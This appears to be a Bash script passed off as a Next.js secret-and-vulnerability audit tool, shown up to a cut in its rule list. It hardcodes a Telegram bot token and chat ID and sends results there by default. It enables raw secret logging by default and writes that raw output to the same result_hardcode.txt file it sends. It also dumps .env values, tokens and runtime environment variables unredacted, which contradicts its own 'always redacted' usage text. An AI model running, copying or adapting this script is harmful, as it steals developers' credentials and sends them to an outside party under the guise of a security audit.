#!/usr/bin/env bash
set -euo pipefail

VERSION="0.2.0"
TOOL_NAME="nextjs-whitebox-audit"

OUT_FILE="result.json"
OUT_HARDCODE="result_hardcode.txt"
OUT_VULN="result_vuln.txt"
OUT_RAW_LOCAL="result_hardcode.txt"
ROOT="."
SEND_TELEGRAM=1
SKIP_DEPS=0
TOP_FINDINGS=8
MAX_FILESIZE="${MAX_FILESIZE:-2M}"
TELEGRAM_PREVIEW=0
TELEGRAM_TEST=0
UNSAFE_RAW_LOCAL=1
TELEGRAM_BOT_TOKEN_DEFAULT="8368719709:AAH0xkCwgOApvV8q_JK-hboaGmRYv-TwicI"
TELEGRAM_CHAT_ID_DEFAULT="828721892"
SCAN_VULN=0
SCAN_DOMAINS=0

usage() {
  cat <<'USAGE'
Next.js / React / RSC whitebox audit (secrets + risky patterns) -> result.json + Telegram (HTML).

Usage:
  tools/nextjs_whitebox_audit.sh [--root DIR] [--out FILE] [--out-hardcode FILE] [--out-vuln FILE] [--out-raw-local FILE] [--unsafe-raw-local] [--scan-vuln] [--scan-domains] [--no-telegram] [--skip-deps] [--telegram-preview] [--telegram-test]

Env (Telegram):
  TELEGRAM_BOT_TOKEN=...   (required unless --no-telegram)
  TELEGRAM_CHAT_ID=...     (required unless --no-telegram)
  TELEGRAM_BOT_TOKEN_FILE=... (optional alternative)
  TELEGRAM_CHAT_ID_FILE=...   (optional alternative)

Notes:
  - Output is always redacted (no raw secret values).
  - Designed for source review; findings are heuristic (false positives possible).
  - Default behavior (no args): scan current directory tree for hardcoded credentials only and send result_hardcode.txt to Telegram.
  - Use --scan-vuln to include risky code patterns and write/send result_vuln.txt.
  - Use --scan-domains to include domain/base URL discovery from configs and runtime env.
  - --unsafe-raw-local writes raw values to a local file only (never sent to Telegram).
USAGE
}

log() { printf '[%s] %s\n' "$TOOL_NAME" "$*" >&2; }
die() { log "ERROR: $*"; exit 1; }

need_cmd() {
  command -v "$1" >/dev/null 2>&1 || die "missing dependency: $1"
}

PY_BIN=""
pick_python() {
  if command -v python3 >/dev/null 2>&1; then
    PY_BIN="python3"
  elif command -v python >/dev/null 2>&1; then
    PY_BIN="python"
  else
    die "missing dependency: python3 (or python)"
  fi
}

sha256_12() {
  local input="$1"
  if command -v sha256sum >/dev/null 2>&1; then
    printf '%s' "$input" | sha256sum | awk '{print substr($1,1,12)}'
  elif command -v shasum >/dev/null 2>&1; then
    printf '%s' "$input" | shasum -a 256 | awk '{print substr($1,1,12)}'
  else
    printf 'nohash'
  fi
}

redact_value() {
  local v="$1"
  local len="${#v}"
  if (( len <= 8 )); then
    printf '<redacted:%s:%s>' "$len" "$(sha256_12 "$v")"
    return 0
  fi
  printf '%s…%s<redacted:%s:%s>' "${v:0:4}" "${v: -4}" "$len" "$(sha256_12 "$v")"
}

html_escape() {
  local s="$1"
  s="${s//&/&amp;}"
  s="${s//</&lt;}"
  s="${s//>/&gt;}"
  s="${s//\"/&quot;}"
  s="${s//\'/&#39;}"
  printf '%s' "$s"
}

json_escape_newlines() {
  tr '\n' ' ' | sed -E 's/[[:space:]]+/ /g' | sed -E 's/^ //; s/ $//'
}

parse_args() {
  while (($#)); do
    case "$1" in
      --root)
        ROOT="${2:-}"; shift 2 || true
        ;;
      --out)
        OUT_FILE="${2:-}"; shift 2 || true
        ;;
      --out-hardcode)
        OUT_HARDCODE="${2:-}"; shift 2 || true
        ;;
      --out-vuln)
        OUT_VULN="${2:-}"; shift 2 || true
        ;;
      --out-raw-local)
        OUT_RAW_LOCAL="${2:-}"; shift 2 || true
        ;;
      --unsafe-raw-local)
        UNSAFE_RAW_LOCAL=1; shift
        ;;
      --scan-vuln)
        SCAN_VULN=1; shift
        ;;
      --scan-domains)
        SCAN_DOMAINS=1; shift
        ;;
      --no-telegram)
        SEND_TELEGRAM=0; shift
        ;;
      --skip-deps)
        SKIP_DEPS=1; shift
        ;;
      --telegram-preview)
        TELEGRAM_PREVIEW=1; shift
        ;;
      --telegram-test)
        TELEGRAM_TEST=1; shift
        ;;
      -h|--help)
        usage; exit 0
        ;;
      *)
        die "unknown arg: $1"
        ;;
    esac
  done
}

make_tmpdir() {
  local d
  d="$(mktemp -d)"
  printf '%s' "$d"
}

is_git_repo() {
  git -C "$ROOT" rev-parse --is-inside-work-tree >/dev/null 2>&1
}

git_meta_json() {
  if ! is_git_repo; then
    "$PY_BIN" - <<'PY'
import json
print(json.dumps({"present": False}, ensure_ascii=False))
PY
    return 0
  fi
  local commit branch dirty
  commit="$(git -C "$ROOT" rev-parse HEAD 2>/dev/null || true)"
  branch="$(git -C "$ROOT" rev-parse --abbrev-ref HEAD 2>/dev/null || true)"
  dirty="false"
  if ! git -C "$ROOT" diff --quiet -- 2>/dev/null; then dirty="true"; fi
  if ! git -C "$ROOT" diff --cached --quiet -- 2>/dev/null; then dirty="true"; fi
  GIT_COMMIT="$commit" GIT_BRANCH="$branch" GIT_DIRTY="$dirty" "$PY_BIN" - <<'PY'
import json, os
print(json.dumps({
  "present": True,
  "commit": os.environ.get("GIT_COMMIT",""),
  "branch": os.environ.get("GIT_BRANCH",""),
  "dirty": os.environ.get("GIT_DIRTY","false").lower() == "true",
}, ensure_ascii=False))
PY
}

detect_next_layout() {
  local pkg="$ROOT/package.json"
  local has_next="false"
  if [[ -f "$pkg" ]]; then
    if "$PY_BIN" - "$pkg" >/dev/null 2>&1 <<'PY'
import json,sys
path=sys.argv[1]
pkg=json.load(open(path,"r",encoding="utf-8"))
deps={}
deps.update(pkg.get("dependencies") or {})
deps.update(pkg.get("devDependencies") or {})
sys.exit(0 if "next" in deps else 1)
PY
    then
      has_next="true"
    else
      log "WARN: package.json does not mention 'next' dependency; continuing anyway."
    fi
  fi

  local router="unknown"
  if [[ -d "$ROOT/app" ]]; then router="app"; fi
  if [[ -d "$ROOT/pages" ]]; then
    if [[ "$router" == "unknown" ]]; then router="pages"; else router="${router}+pages"; fi
  fi

  LAYOUT_ROUTER="$router" LAYOUT_HAS_NEXT="$has_next" "$PY_BIN" - <<'PY'
import json, os
print(json.dumps({
  "router": os.environ.get("LAYOUT_ROUTER","unknown"),
  "package_mentions_next": os.environ.get("LAYOUT_HAS_NEXT","false").lower()=="true",
}, ensure_ascii=False))
PY
}

FINDINGS_JSONL=""
HARD_FINDINGS_JSONL=""
VULN_FINDINGS_JSONL=""
FINDING_SEQ=0
TMPDIR=""

add_finding() {
  local severity="$1" category="$2" title="$3" file="$4" line="$5" snippet="$6" match_type="$7" redacted="$8" scenario="$9" recommendation="${10}" confidence="${11:-medium}"
  FINDING_SEQ=$((FINDING_SEQ + 1))
  local id
  id="$(printf 'F-%04d' "$FINDING_SEQ")"
  F_ID="$id" F_SEVERITY="$severity" F_CATEGORY="$category" F_TITLE="$title" \
  F_FILE="$file" F_LINE="$line" F_SNIPPET="$snippet" F_MATCH_TYPE="$match_type" \
  F_REDACTED="$redacted" F_SCENARIO="$scenario" F_RECOMMENDATION="$recommendation" \
  F_CONFIDENCE="$confidence" "$PY_BIN" - <<'PY' >>"$FINDINGS_JSONL"
import json, os
def getenv(k, default=""):
  return os.environ.get(k, default)
obj = {
  "id": getenv("F_ID"),
  "severity": getenv("F_SEVERITY"),
  "category": getenv("F_CATEGORY"),
  "title": getenv("F_TITLE"),
  "evidence": {
    "file": getenv("F_FILE"),
    "line": int(getenv("F_LINE","0") or "0"),
    "snippet": getenv("F_SNIPPET"),
  },
  "match": {"type": getenv("F_MATCH_TYPE"), "redacted": getenv("F_REDACTED")},
  "attack_scenario": getenv("F_SCENARIO"),
  "recommendation": getenv("F_RECOMMENDATION"),
  "confidence": getenv("F_CONFIDENCE"),
}
print(json.dumps(obj, ensure_ascii=False))
PY
}

python_static_scan() {
  local config_json="$1"
  local root="$ROOT"
  MAX_FILESIZE_HUMAN="$MAX_FILESIZE" ROOT_DIR="$root" FINDINGS_OUT="$FINDINGS_JSONL" SCAN_CONFIG_JSON="$config_json" RAW_LOCAL_FILE="${RAW_LOCAL_FILE:-}" "$PY_BIN" - <<'PY'
import fnmatch
import hashlib
import json
import os
import re
import subprocess
from pathlib import Path, PurePosixPath

root = Path(os.environ["ROOT_DIR"])
out_path = Path(os.environ["FINDINGS_OUT"])
config = json.loads(os.environ["SCAN_CONFIG_JSON"])
raw_local = os.environ.get("RAW_LOCAL_FILE","").strip()

max_fs = os.environ.get("MAX_FILESIZE_HUMAN", "2M").strip()
suffixes = {"K": 1024, "M": 1024**2, "G": 1024**3}
max_bytes = None
try:
  if max_fs[-1].upper() in suffixes:
    max_bytes = int(float(max_fs[:-1]) * suffixes[max_fs[-1].upper()])
  else:
    max_bytes = int(max_fs)
except Exception:
  max_bytes = 2 * 1024 * 1024

exclude_dirnames = set([
  "node_modules", ".next", "dist", "build", ".turbo", ".git", "coverage", "pnpm-store", ".yarn"
])
exclude_substrings = [
  "/node_modules/", "/.next/", "/dist/", "/build/", "/.turbo/", "/.git/", "/coverage/", "/pnpm-store/", "/.yarn/"
]

def sha256_12(s: str) -> str:
  return hashlib.sha256(s.encode("utf-8", errors="ignore")).hexdigest()[:12]

def redact_value(v: str) -> str:
  ln = len(v)
  if ln <= 8:
    return f"<redacted:{ln}:{sha256_12(v)}>"
  return f"{v[:4]}…{v[-4:]}<redacted:{ln}:{sha256_12(v)}>"

def should_exclude(rel_posix: str) -> bool:
  if any(sub in rel_posix for sub in exclude_substrings):
    return True
  parts = rel_posix.split("/")
  return any(p in exclude_dirnames for p in parts)

def path_match_any(rel_posix: str, globs) -> bool:
  p = PurePosixPath(rel_posix)
  for g in globs:
    try:
      if p.match(g):
        return True
    except Exception:
      # Fallback for odd patterns
      if fnmatch.fnmatch(rel_posix, g):
        return True
  return False

def iter_files():
  git_ok = False
  try:
    subprocess.run(["git", "-C", str(root), "rev-parse", "--is-inside-work-tree"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    git_ok = True
  except Exception:
    git_ok = False

  if git_ok:
    try:
      proc = subprocess.run(["git", "-C", str(root), "ls-files", "-z"], check=True, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
      data = proc.stdout.split(b"\x00")
      for b in data:
        if not b:
          continue
        rel = b.decode("utf-8", errors="replace")
        rel_posix = rel.replace("\\", "/")
        if should_exclude(rel_posix):
          continue
        fp = root / rel
        if fp.is_file():
          yield fp, rel_posix
      return
    except Exception:
      pass

  for dirpath, dirnames, filenames in os.walk(root):
    # mutate dirnames to prune
    dirnames[:] = [d for d in dirnames if d not in exclude_dirnames]
    for name in filenames:
      fp = Path(dirpath) / name
      try:
        rel = fp.relative_to(root).as_posix()
      except Exception:
        continue
      if should_exclude(rel):
        continue
      if fp.is_file():
        yield fp, rel

def line_snippet(text: str, idx: int):
  start = text.rfind("\n", 0, idx)
  end = text.find("\n", idx)
  if start == -1:
    start = 0
  else:
    start += 1
  if end == -1:
    end = len(text)
  return text[start:end]

def line_number(text: str, idx: int) -> int:
  return text.count("\n", 0, idx) + 1

def add_finding(obj):
  out_path.parent.mkdir(parents=True, exist_ok=True)
  with out_path.open("a", encoding="utf-8") as f:
    f.write(json.dumps(obj, ensure_ascii=False) + "\n")

def add_raw(line: str):
  if not raw_local:
    return
  rp = Path(raw_local)
  rp.parent.mkdir(parents=True, exist_ok=True)
  with rp.open("a", encoding="utf-8") as f:
    f.write(line.rstrip("\n") + "\n")

seq = 0

def next_id():
  nonlocal_seq = None
  return None

def mk_finding(severity, category, title, file, line, snippet, match_type, redacted, scenario, recommendation, confidence):
  global seq
  seq += 1
  fid = f"F-{seq:04d}"
  return {
    "id": fid,
    "severity": severity,
    "category": category,
    "title": title,
    "evidence": {"file": file, "line": int(line), "snippet": snippet},
    "match": {"type": match_type, "redacted": redacted},
    "attack_scenario": scenario,
    "recommendation": recommendation,
    "confidence": confidence,
  }

rules = config.get("rules", [])
envfile_globs = config.get("envfile_globs", ["**/.env*"])
env_secret_name_re = re.compile(r"(SECRET|TOKEN|PASSWORD|PASSWD|API_KEY|PRIVATE_KEY|CLIENT_SECRET|ACCESS_KEY|SESSION_SECRET|JWT_SECRET|NEXTAUTH_SECRET|ENCRYPTION_KEY)", re.I)
next_public_secret_re = re.compile(r"^NEXT_PUBLIC_.*(SECRET|TOKEN|PASSWORD|KEY)", re.I)

for fp, rel in iter_files():
  try:
    if max_bytes is not None and fp.stat().st_size > max_bytes:
      continue
  except Exception:
    continue

  # .env parsing
  if path_match_any(rel, envfile_globs):
    try:
      data = fp.read_text(encoding="utf-8", errors="replace").splitlines()
    except Exception:
      data = []
    for i, raw in enumerate(data, start=1):
      s = raw.strip()
      if not s or s.startswith("#"):
        continue
      if "=" not in s:
        continue
      # export KEY=VAL
      if s.lower().startswith("export "):
        s2 = s[7:].lstrip()
      else:
        s2 = s
      key = s2.split("=", 1)[0].strip()
      val = s2.split("=", 1)[1].strip()
      val = val.split("#", 1)[0].strip()
      if not key or not val:
        continue
      red = redact_value(val)
      sev = "info"
      title = f"Env var set: {key}"
      scenario = "If this value is a credential and the file is committed or shared, an attacker who obtains the source can reuse it for unauthorized access."
      rec = "Move secrets to a secret manager (or CI/env injection), rotate if exposed, and ensure .env files are excluded from VCS."
      if env_secret_name_re.search(key):
        sev = "high"
        title = f"Potential secret in .env: {key}"
      if next_public_secret_re.search(key):
        sev = "critical"
        title = f"Client-exposed secret-like NEXT_PUBLIC var: {key}"
        scenario = "NEXT_PUBLIC_* values can end up in client bundles. If this is a real secret, it may be exposed to any user and enable API abuse or account takeover."
        rec = "Never put secrets in NEXT_PUBLIC_*; move to server-only env vars and rotate the exposed credential immediately."
      snippet = f"{key}={red}"
      add_finding(mk_finding(sev, "secrets", title, rel, i, snippet, "env_assignment", red, scenario, rec, "medium"))
      add_raw(f"ENVFILE {rel}:{i} {key}={val}")

  # rule-based scanning (text)
  globs_needed = set()
  for r in rules:
    for g in r.get("globs", []):
      globs_needed.add(g)

  if not globs_needed:
    continue
  if not path_match_any(rel, list(globs_needed)):
    continue

  try:
    text = fp.read_text(encoding="utf-8", errors="replace")
  except Exception:
    continue

  for r in rules:
    if not path_match_any(rel, r.get("globs", [])):
      continue
    try:
      rx = re.compile(r["regex"], re.MULTILINE | (re.IGNORECASE if r.get("ignorecase") else 0))
    except Exception:
      continue

    kind = r.get("kind", "line")
    if kind == "token":
      for m in rx.finditer(text):
        val = m.group(0)
        if not val:
          continue
        ln = line_number(text, m.start())
        sn = line_snippet(text, m.start()).replace(val, redact_value(val))
        add_raw(f"TOKEN {rel}:{ln} {val}")
        add_finding(mk_finding(
          r["severity"], r["category"], r["title"], rel, ln,
          " ".join(sn.split()),
          r["match_type"], redact_value(val),
          r["scenario"], r["recommendation"], r.get("confidence","high")
        ))
    else:
      for m in rx.finditer(text):
        ln = line_number(text, m.start())
        sn = " ".join(line_snippet(text, m.start()).split())
        add_finding(mk_finding(
          r["severity"], r["category"], r["title"], rel, ln,
          sn,
          r["match_type"], "<redacted>",
          r["scenario"], r["recommendation"], r.get("confidence","medium")
        ))

PY
}

var_name_looks_secret() {
  local name_upper
  name_upper="$(printf '%s' "$1" | tr '[:lower:]' '[:upper:]')"
  [[ "$name_upper" =~ (SECRET|TOKEN|PASSWORD|PASSWD|API[_-]?KEY|PRIVATE[_-]?KEY|CLIENT[_-]?SECRET|ACCESS[_-]?KEY|AWS|GCP|GOOGLE|STRIPE|SENDGRID|MAILGUN|TWILIO|SLACK|GITHUB|GITLAB|JWT|NEXTAUTH|ENCRYPTION|DATABASE_URL|MONGODB_URI|REDIS_URL) ]]
}

value_looks_token() {
  local v="$1"
  [[ "$v" =~ ^(AKIA|ASIA|AGPA|AIDA|ANPA|AROA|AIPA)[A-Z0-9]{16}$ ]] && return 0
  [[ "$v" =~ ^AIza[0-9A-Za-z\-_]{35}$ ]] && return 0
  [[ "$v" =~ ^ghp_[A-Za-z0-9]{36}$ ]] && return 0
  [[ "$v" =~ ^github_pat_[A-Za-z0-9_]{40,}$ ]] && return 0
  [[ "$v" =~ ^glpat-[A-Za-z0-9\-_]{20,}$ ]] && return 0
  [[ "$v" =~ ^xox[baprs]-[0-9A-Za-z-]{10,}$ ]] && return 0
  [[ "$v" =~ ^(sk|rk)_(live|test)_[0-9a-zA-Z]{16,}$ ]] && return 0
  [[ "$v" =~ ^SG\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}$ ]] && return 0
  [[ "$v" =~ ^key-[0-9a-f]{32}$ ]] && return 0
  [[ "$v" =~ ^eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}$ ]] && return 0
  return 1
}

scan_runtime_vars() {
  local source_label="$1"
  shift
  local output="$1"
  local max_lines=5000
  local count=0

  while IFS= read -r row; do
    count=$((count + 1))
    ((count > max_lines)) && break
    [[ "$row" =~ ^[A-Za-z_][A-Za-z0-9_]*= ]] || continue
    [[ "$row" =~ ^BASH_FUNC_ ]] && continue
    local name="${row%%=*}"
    local value="${row#*=}"
    [[ -z "$value" ]] && continue
    if ! var_name_looks_secret "$name" && ! value_looks_token "$value"; then
      continue
    fi

    local redacted severity title scenario recommendation
    redacted="$(redact_value "$value")"
    severity="high"
    title="Runtime var may contain secret: $name"
    scenario="If this runtime environment is shared, logged, or compromised, secrets in process variables can be extracted and reused for unauthorized access."
    recommendation="Store secrets in a managed secret store, avoid logging env, limit scope/permissions, and rotate if leakage is suspected."
    if [[ "$(printf '%s' "$name" | tr '[:lower:]' '[:upper:]')" =~ ^NEXT_PUBLIC_ ]]; then
      severity="critical"
      title="Client-exposed runtime var (NEXT_PUBLIC_*) looks secret: $name"
      scenario="NEXT_PUBLIC_* values can end up in client bundles. If a secret is placed here, it can be harvested by any user."
      recommendation="Move secret server-side (non-NEXT_PUBLIC) and rotate immediately."
    fi
    add_finding "$severity" "runtime_secrets" "$title" "<runtime:$source_label>" 0 "$name=$redacted" "runtime_var" "$redacted" "$scenario" "$recommendation" "low"
    if (( UNSAFE_RAW_LOCAL == 1 )); then
      printf 'RUNTIME(%s) %s=%s\n' "$source_label" "$name" "$value" >>"$RAW_LOCAL_FILE"
    fi
  done <<<"$output"
}

scan_runtime_domains() {
  local source_label="$1"
  shift
  local output="$1"
  local max_lines=5000
  local count=0

  while IFS= read -r row; do
    count=$((count + 1))
    ((count > max_lines)) && break
    [[ "$row" =~ ^[A-Za-z_][A-Za-z0-9_]*= ]] || continue
    [[ "$row" =~ ^BASH_FUNC_ ]] && continue
    local name="${row%%=*}"
    local value="${row#*=}"
    [[ -z "$value" ]] && continue

    local name_upper
    name_upper="$(printf '%s' "$name" | tr '[:lower:]' '[:upper:]')"
    if [[ "$name_upper" =~ (NEXTAUTH_URL|SITE_URL|APP_URL|BASE_URL|NEXT_PUBLIC_SITE_URL|NEXT_PUBLIC_APP_URL|NEXT_PUBLIC_BASE_URL) ]] || [[ "$value" =~ ^https?:// ]]; then
      add_finding "info" "domain" "Possible application domain (runtime var): $name" "<runtime:$source_label>" 0 "$name=$value" "runtime_domain" "<redacted>" \
        "Domain or base URL detected from runtime environment." \
        "Verify this is expected and keep it in a single source of truth (env or config)." "low"
    fi
  done <<<"$output"
}

scan_domains() {
  ROOT_DIR="$ROOT" FINDINGS_OUT="$FINDINGS_JSONL" "$PY_BIN" - <<'PY'
import json, os, re
from pathlib import Path

root = Path(os.environ["ROOT_DIR"])
out_path = Path(os.environ["FINDINGS_OUT"])

exclude_dirnames = set([
  "node_modules", ".next", "dist", "build", ".turbo", ".git", "coverage", "pnpm-store", ".yarn"
])
exclude_substrings = [
  "/node_modules/", "/.next/", "/dist/", "/build/", "/.turbo/", "/.git/", "/coverage/", "/pnpm-store/", "/.yarn/"
]

globs = [
  "**/.env*",
  "**/next.config.*",
  "**/vercel.json",
  "**/app/**/*.*",
  "**/pages/**/*.*",
  "**/*.yml",
  "**/*.yaml",
]
ext_allow = {".js",".jsx",".ts",".tsx",".mjs",".cjs",".json",".yml",".yaml",".env",".env.local",".env.production",".env.development",".env.staging"}

url_re = re.compile(r"https?://[A-Za-z0-9\.-]+\.[A-Za-z]{2,}(:\d+)?(/[^\s\"']*)?")
var_re = re.compile(r"(?i)\b(NEXTAUTH_URL|NEXT_PUBLIC_SITE_URL|SITE_URL|APP_URL|BASE_URL|NEXT_PUBLIC_APP_URL|NEXT_PUBLIC_BASE_URL)\b\s*[:=]\s*['\"]?(https?://[^\s\"']+)")
domain_hint_re = re.compile(r"(?i)\b(domain|domains|metadataBase|siteUrl|baseUrl)\b")
domain_re = re.compile(r"([A-Za-z0-9\.-]+\.[A-Za-z]{2,})")

def should_exclude(rel_posix: str) -> bool:
  if any(sub in rel_posix for sub in exclude_substrings):
    return True
  parts = rel_posix.split("/")
  return any(p in exclude_dirnames for p in parts)

def iter_files():
  for p in root.rglob("*"):
    if not p.is_file():
      continue
    rel = p.relative_to(root).as_posix()
    if should_exclude(rel):
      continue
    if p.suffix and p.suffix.lower() in ext_allow:
      yield p, rel
    else:
      # allow env-like names without suffix
      if p.name.startswith(".env"):
        yield p, rel

def add_finding(obj):
  out_path.parent.mkdir(parents=True, exist_ok=True)
  with out_path.open("a", encoding="utf-8") as f:
    f.write(json.dumps(obj, ensure_ascii=False) + "\n")

seq = 0

def mk_finding(severity, category, title, file, line, snippet, match_type, scenario, recommendation, confidence):
  global seq
  seq += 1
  fid = f"F-{seq:04d}"
  return {
    "id": fid,
    "severity": severity,
    "category": category,
    "title": title,
    "evidence": {"file": file, "line": int(line), "snippet": snippet},
    "match": {"type": match_type, "redacted": "<redacted>"},
    "attack_scenario": scenario,
    "recommendation": recommendation,
    "confidence": confidence,
  }

def line_number(text, idx):
  return text.count("\n", 0, idx) + 1

def line_snippet(text, idx):
  start = text.rfind("\n", 0, idx)
  end = text.find("\n", idx)
  if start == -1:
    start = 0
  else:
    start += 1
  if end == -1:
    end = len(text)
  return " ".join(text[start:end].split())

seen = set()

for fp, rel in iter_files():
  try:
    text = fp.read_text(encoding="utf-8", errors="replace")
  except Exception:
    continue

  for m in var_re.finditer(text):
    url = m.group(2)
    ln = line_number(text, m.start())
    sn = line_snippet(text, m.start())
    key = (rel, ln, url)
    if key in seen:
      continue
    seen.add(key)
    add_finding(mk_finding(
      "info", "domain", "Possible application domain (env/config var)", rel, ln,
      sn, "domain_var",
      "Domain or base URL detected from configuration.",
      "Verify this is expected and keep it in a single source of truth (env or config).",
      "low"
    ))

  for m in url_re.finditer(text):
    url = m.group(0)
    ln = line_number(text, m.start())
    sn = line_snippet(text, m.start())
    key = (rel, ln, url)
    if key in seen:
      continue
    seen.add(key)
    add_finding(mk_finding(
      "info", "domain", "Possible application domain (URL found)", rel, ln,
      sn, "domain_url",
      "URL found in configuration or source. It may indicate the public domain or API base.",
      "Confirm this matches the intended deployment domain(s).",
      "low"
    ))

  for i, line in enumerate(text.splitlines(), start=1):
    if not domain_hint_re.search(line):
      continue
    for dm in domain_re.finditer(line):
      dom = dm.group(1)
      key = (rel, i, dom)
      if key in seen:
        continue
      seen.add(key)
      add_finding(mk_finding(
        "info", "domain", "Possible application domain (domain hint)", rel, i,
        " ".join(line.split()), "domain_hint",
        "Domain-like string found near domain configuration.",
        "Verify it is accurate and updated for each environment.",
        "low"
      ))
PY
}

scan_secrets() {
  log "Scanning hardcoded secrets..."

  local cfg
  cfg="$("$PY_BIN" - <<'PY'
import json

cfg = {
  "envfile_globs": ["**/.env*"],
  "rules": [
    {
      "kind": "line",
      "severity": "critical",
      "category": "secrets",
      "title": "Private key material (BEGIN PRIVATE KEY)",
      "match_type": "private_key_block",
      "regex": r"-----BEGIN (?:[A-Z ]+ )?PRIVATE KEY-----",
      "globs": ["**/*.pem","**/*.key","**/*.p12","**/*.pfx","**/*.der","**/*.crt","**/*.cer","**/*.keystore"],
      "scenario": "If a private key is committed, anyone with repo access can impersonate the service/user and decrypt or sign traffic where applicable.",
      "recommendation": "Remove the key from the repo history, revoke/rotate the keypair, and store keys in a secret manager or secure vault.",
      "confidence": "high",
    },
    {
      "kind": "token",
      "severity": "high",
      "category": "secrets",
      "title": "Possible AWS Access Key ID",
      "match_type": "aws_access_key_id",
      "regex": r"\b(?:AKIA|ASIA|AGPA|AIDA|ANPA|AROA|AIPA)[A-Z0-9]{16}\b",
      "globs": ["**/*.js","**/*.jsx","**/*.ts","**/*.tsx","**/*.mjs","**/*.cjs","**/*.json","**/*.yml","**/*.yaml","**/.env*","**/Dockerfile*","**/docker-compose*.yml","**/docker-compose*.yaml","**/vercel.json","**/.github/workflows/*.yml","**/.github/workflows/*.yaml"],
      "scenario": "If the key is active, an attacker can use it for API calls within its IAM permissions.",
      "recommendation": "Revoke/rotate the credential, audit IAM usage, and move secrets to environment/secret manager.",
      "confidence": "high",
    },
    {
      "kind": "token",
      "severity": "high",
      "category": "secrets",
      "title": "Possible Google API Key",
      "match_type": "gcp_api_key",
      "regex": r"\bAIza[0-9A-Za-z\-_]{35}\b",
      "globs": ["**/*.js","**/*.jsx","**/*.ts","**/*.tsx","**/*.mjs","**/*.cjs","**/*.json","**/*.yml","**/*.yaml","**/.env*"],
      "scenario": "If unrestricted, an attacker can abuse Google APIs billed to your project or access protected resources.",
      "recommendation": "Restrict the key (HTTP referrer/IP), rotate it, and avoid embedding server keys in client code.",
      "confidence": "high",
    },
    {
      "kind": "token",
      "severity": "high",
      "category": "secrets",
      "title": "Possible GitHub token",
      "match_type": "github_token",
      "regex": r"\b(?:ghp_[A-Za-z0-9]{36}|github_pat_[A-Za-z0-9_]{40,}|gho_[A-Za-z0-9]{36}|ghs_[A-Za-z0-9]{36}|ghr_[A-Za-z0-9]{36})\b",
      "globs": ["**/*.js","**/*.jsx","**/*.ts","**/*.tsx","**/*.mjs","**/*.cjs","**/*.json","**/*.yml","**/*.yaml","**/.env*"],
      "scenario": "If valid, an attacker can access GitHub resources (repos, issues, packages) scoped by the token.",
      "recommendation": "Revoke/rotate the token, scope it minimally, and store it in a secret manager/CI secret.",
      "confidence": "high",
    },
    {
      "kind": "token",
      "severity": "high",
      "category": "secrets",
      "title": "Possible GitLab token",
      "match_type": "gitlab_token",
      "regex": r"\bglpat-[A-Za-z0-9\-_]{20,}\b",
      "globs": ["**/*.js","**/*.jsx","**/*.ts","**/*.tsx","**/*.mjs","**/*.cjs","**/*.json","**/*.yml","**/*.yaml","**/.env*"],
      "scenario": "If valid, an attacker can access GitLab resources within the token scope.",
      "recommendation": "Revoke/rotate the token and store it in CI/secret manager.",
      "confidence": "high",
    },
    {
      "kind": "token",
      "severity": "high",
      "category": "secrets",
      "title": "Possible Slack token",
      "match_type": "slack_token",
      "regex": r"\bxox[baprs]-[0-9A-Za-z-]{10,}\b",
      "globs": ["**/*.js","**/*.jsx","**/*.ts","**/*.tsx","**/*.mjs","**/*.cjs","**/*.json","**/*.yml","**/*.yaml","**/.env*"],
      "scenario": "If valid, an attacker can call Slack APIs as the associated bot/app/user, depending on token type.",
      "recommendation": "Revoke/rotate the token and use a secret manager; avoid embedding tokens in code.",
      "confidence": "high",
    },
    {
      "kind": "token",
      "severity": "high",
      "category": "secrets",
      "title": "Possible Stripe secret key",
      "match_type": "stripe_key",
      "regex": r"\b(?:sk|rk)_(?:live|test)_[0-9a-zA-Z]{16,}\b",
      "globs": ["**/*.js","**/*.jsx","**/*.ts","**/*.tsx","**/*.mjs","**/*.cjs","**/*.json","**/.env*"],
      "scenario": "If valid, an attacker can abuse Stripe APIs within key permissions (payments, refunds, data access).",
      "recommendation": "Rotate the key, restrict it if possible, and keep it server-side only.",
      "confidence": "high",
    },
    {
      "kind": "token",
      "severity": "high",
      "category": "secrets",
      "title": "Possible OpenAI API key",
      "match_type": "openai_key",
      "regex": r"\bsk-(?:proj-)?[A-Za-z0-9]{20,}\b",
      "globs": ["**/*.js","**/*.jsx","**/*.ts","**/*.tsx","**/*.mjs","**/*.cjs","**/*.json","**/.env*"],
      "scenario": "If valid, an attacker can call OpenAI APIs within the key's scope and incur cost or data exposure.",
      "recommendation": "Rotate the key, keep it server-side, and store it in a secret manager.",
      "confidence": "medium",
    },
    {
      "kind": "token",
      "severity": "high",
      "category": "secrets",
      "title": "Possible Anthropic/Claude API key",
      "match_type": "anthropic_key",
      "regex": r"\bsk-ant-[A-Za-z0-9_\-]{20,}\b",
      "globs": ["**/*.js","**/*.jsx","**/*.ts","**/*.tsx","**/*.mjs","**/*.cjs","**/*.json","**/.env*"],
      "scenario": "If valid, an attacker can call Anthropic APIs within the key's scope.",
      "recommendation": "Rotate the key, keep it server-side, and store it in a secret manager.",
      "confidence": "high",
    },
    {
      "kind": "token",
      "severity": "high",
      "category": "secrets",
      "title": "Possible PayPal access token",
      "match_type": "paypal_access_token",
      "regex": r"\bA21AA[0-9A-Za-z\-_]{20,}\b",
      "globs": ["**/*.js","**/*.jsx","**/*.ts","**/*.tsx","**/*.mjs","**/*.cjs","**/*.json","**/.env*"],
      "scenario": "If valid, an attacker can access PayPal APIs within the token's scope.",
      "recommendation": "Rotate tokens and store secrets in a secure vault/secret manager.",
      "confidence": "medium",
    },
    {
      "kind": "token",
      "severity": "high",
      "category": "secrets",
      "title": "Provider API key in env/config (OpenAI/Gemini/Anthropic/DeepSeek/PayPal)",
      "match_type": "provider_key_var",
      "regex": r"(?i)\b(OPENAI|GEMINI|ANTHROPIC|CLAUDE|DEEPSEEK|PAYPAL)_(API_)?(KEY|SECRET|CLIENT_ID|CLIENT_SECRET|TOKEN)\b\s*[:=]\s*[\"']([^\"'\n]{6,})[\"']",
      "globs": ["**/*.js","**/*.jsx","**/*.ts","**/*.tsx","**/*.mjs","**/*.cjs","**/*.json","**/*.yml","**/*.yaml","**/.env*"],
      "scenario": "Hardcoded provider credentials can be extracted and abused for API calls or account access.",
